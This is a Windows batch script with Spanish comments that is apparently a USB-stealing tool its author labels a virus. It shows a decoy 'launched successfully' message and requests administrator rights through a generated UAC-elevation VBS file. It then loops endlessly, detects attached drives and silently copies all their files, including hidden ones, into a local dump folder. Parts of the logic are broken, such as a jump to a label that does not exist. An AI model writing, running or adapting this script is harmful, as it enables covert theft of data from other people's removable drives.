
@echo off

if not exist "C:\Windows\script.vbs"  echo Msgbox "LA APLICACION HA SIDO LANZADA CON EXITO",84,"Windows Script Host">> C:\Windows\script.vbs

if exist "C:\Windows\script.vbs"  start C:\Windows\script.vbs



:CICLO-VIRUS

@echo off

color A

REM .bat con permisos de administrador
:-------------------------------------
REM  --> Analizando los permisos
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> Si hay error es que no hay permisos de administrador.
if '%errorlevel%' NEQ '0' (
    echo Solicitando permisos de administrador... Requesting administrative privileges... Anfordern Administratorrechte ...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------  



color a
echo Esperando usb... 

for %%u in (a, b, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z) do (
        dir /b %%u:\ > nul 2>&1 && (
           for /f "tokens=8*" %%a in ('vol %%u: ^| find "volumen de la unidad"') do (echo Unidad %%u:\ "%%a" detectada

if exist "DUMP-USB-%RANDOM%\" (goto USB) else (xcopy /d /c /e /h /y "%%u:"\*.* DUMP-USB-%RANDOM%\ & goto USB)
    )
  )
)

goto CICLO-VIRUS
exit
